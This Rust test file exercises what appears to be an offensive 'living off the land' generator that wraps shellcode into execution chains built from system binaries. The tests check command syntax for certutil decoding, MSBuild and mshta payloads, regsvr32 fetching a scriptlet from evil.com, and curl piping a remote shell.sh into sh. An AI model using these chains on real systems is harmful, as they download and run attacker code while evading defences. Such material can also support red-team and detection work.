use super::lolbin_generator::*;

#[test]
fn test_windows_chain_generation() {
    let shellcode = b"\xcc\x90\x90\xc3";
    let chain = LolbinGenerator::generate_chain(Platform::Windows, shellcode);
    assert_eq!(chain.platform, Platform::Windows);
    assert!(!chain.steps.is_empty());
    for step in &chain.steps {
        assert!(!step.command.is_empty());
        assert!(!step.binary.is_empty());
    }
}

#[test]
fn test_linux_chain_generation() {
    let shellcode = b"\x48\x31\xc0\xc3";
    let chain = LolbinGenerator::generate_chain(Platform::Linux, shellcode);
    assert_eq!(chain.platform, Platform::Linux);
    assert!(!chain.steps.is_empty());
    for step in &chain.steps {
        assert!(!step.command.is_empty());
        assert!(!step.binary.is_empty());
    }
}

#[test]
fn test_certutil_decode_syntax() {
    let step = LolbinGenerator::windows_certutil_decode("AQIDBA==");
    assert!(step.command.contains("certutil"));
    assert!(step.command.contains("-decode"));
    assert_eq!(step.binary, "certutil.exe");
    assert!(!step.requires_admin);
}

#[test]
fn test_msbuild_xml_valid() {
    let xml = LolbinGenerator::encode_payload(b"test", PayloadEncoding::XmlMsbuild);
    assert!(xml.contains("<Project"));
    assert!(xml.contains("ToolsVersion"));
    assert!(xml.contains("<Target"));
    assert!(xml.contains("</Project>"));
}

#[test]
fn test_mshta_syntax() {
    let step = LolbinGenerator::windows_mshta("CreateObject(\"Wscript.Shell\").Run \"calc\"");
    assert!(step.command.contains("mshta"));
    assert!(step.command.contains("vbscript:Execute"));
    assert_eq!(step.binary, "mshta.exe");
}

#[test]
fn test_python_exec_syntax() {
    let step = LolbinGenerator::linux_python_exec("import os; os.system('id')");
    assert!(step.command.contains("python3 -c"));
    assert!(step.command.contains("import os"));
    assert_eq!(step.binary, "python3");
}

#[test]
fn test_base64_encoding() {
    let data = b"Hello, World!";
    let encoded = LolbinGenerator::encode_payload(data, PayloadEncoding::Base64);
    assert_eq!(encoded, "SGVsbG8sIFdvcmxkIQ==");
}

#[test]
fn test_all_binaries_are_legitimate() {
    let windows_db = LolbinGenerator::lolbas_database();
    let known_windows: Vec<&str> = vec![
        "certutil.exe",
        "regsvr32.exe",
        "mshta.exe",
        "MSBuild.exe",
        "rundll32.exe",
        "InstallUtil.exe",
        "cmstp.exe",
        "msiexec.exe",
        "wmic.exe",
        "bitsadmin.exe",
    ];
    for entry in &windows_db {
        assert!(
            known_windows.contains(&entry.binary.as_str()),
            "Unknown Windows binary: {}",
            entry.binary
        );
    }

    let linux_db = LolbinGenerator::linux_lolbins_database();
    let known_linux: Vec<&str> = vec![
        "python3", "perl", "curl", "awk", "bash", "php", "ruby", "wget", "nc", "openssl",
    ];
    for entry in &linux_db {
        assert!(
            known_linux.contains(&entry.binary.as_str()),
            "Unknown Linux binary: {}",
            entry.binary
        );
    }
}

#[test]
fn test_regsvr32_syntax() {
    let step = LolbinGenerator::windows_regsvr32("http://evil.com/payload.sct");
    assert!(step.command.contains("regsvr32"));
    assert!(step.command.contains("/s /n /u /i:"));
    assert!(step.command.contains("scrobj.dll"));
}

#[test]
fn test_curl_pipe_syntax() {
    let step = LolbinGenerator::linux_curl_pipe("http://10.0.0.1/shell.sh");
    assert!(step.command.contains("curl -sSL"));
    assert!(step.command.contains("| sh"));
    assert_eq!(step.binary, "curl");
}

#[test]
fn test_awk_system_syntax() {
    let step = LolbinGenerator::linux_awk_system("id");
    assert!(step.command.contains("awk"));
    assert!(step.command.contains("BEGIN"));
    assert!(step.command.contains("system"));
    assert_eq!(step.binary, "awk");
}
